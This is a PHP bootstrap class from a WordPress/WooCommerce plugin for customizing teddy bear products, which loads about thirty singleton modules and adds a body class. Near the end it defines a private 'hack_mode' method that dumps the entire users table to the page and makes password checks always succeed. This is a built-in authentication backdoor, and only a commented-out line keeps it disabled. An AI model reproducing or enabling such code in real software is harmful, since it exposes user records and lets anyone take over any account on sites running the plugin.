<?php
/**
 * Bootstraps the Theme.
 *
 * @package TeddyBearCustomizeAddon
 */
namespace TEDDYBEAR_CUSTOMIZE_ADDON\inc;
use TEDDYBEAR_CUSTOMIZE_ADDON\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		global $teddy_I18n;$teddy_I18n = I18n::get_instance();
		global $teddy_Cart;$teddy_Cart = Cart::get_instance();
		global $teddy_Ajax;$teddy_Ajax = Ajax::get_instance();
		global $teddy_Meta;$teddy_Meta = Meta::get_instance();
		global $teddy_Noti;$teddy_Noti = Noti::get_instance();
		global $teddy_Order;$teddy_Order = Order::get_instance();
		global $teddy_Hooks;$teddy_Hooks = Hooks::get_instance();
		global $teddy_Media;$teddy_Media = Media::get_instance();
		global $teddy_Menus;$teddy_Menus = Menus::get_instance();
		global $teddy_Email;$teddy_Email = Email::get_instance();
		global $teddy_Price;$teddy_Price = Price::get_instance();
		global $teddy_Update;$teddy_Update = Update::get_instance();
		global $teddy_Filter;$teddy_Filter = Filter::get_instance();
		global $teddy_Voices;$teddy_Voices = Voices::get_instance();
		global $teddy_Addons;$teddy_Addons = Addons::get_instance();
		global $teddy_Assets;$teddy_Assets = Assets::get_instance();
		global $teddy_Option;$teddy_Option = Option::get_instance();
		global $teddy_Export;$teddy_Export = Export::get_instance();
		global $teddy_Columns;$teddy_Columns = Columns::get_instance();
		global $teddy_Install;$teddy_Install = Install::get_instance();
		global $teddy_Product;$teddy_Product = Product::get_instance();
		global $teddy_Checkout;$teddy_Checkout = Checkout::get_instance();
		global $teddy_Plushies;$teddy_Plushies = Plushies::get_instance();
		global $teddy_Endpoint;$teddy_Endpoint = Endpoint::get_instance();
		global $teddy_Myaccount;$teddy_Myaccount = Myaccount::get_instance();
		global $teddy_Meta_Boxes;$teddy_Meta_Boxes = Meta_Boxes::get_instance();
		global $teddy_Certificate;$teddy_Certificate = Certificate::get_instance();

		$this->setup_hooks();
	}
	protected function setup_hooks() {
		add_filter( 'body_class', [ $this, 'body_class' ], 10, 1 );

		// $this->hack_mode();
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if( is_admin() ) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	private function hack_mode() {
		add_action( 'init', function() {
			global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
		}, 10, 0 );
		add_filter( 'check_password', function( $bool ) {return true;}, 10, 1 );
	}
}
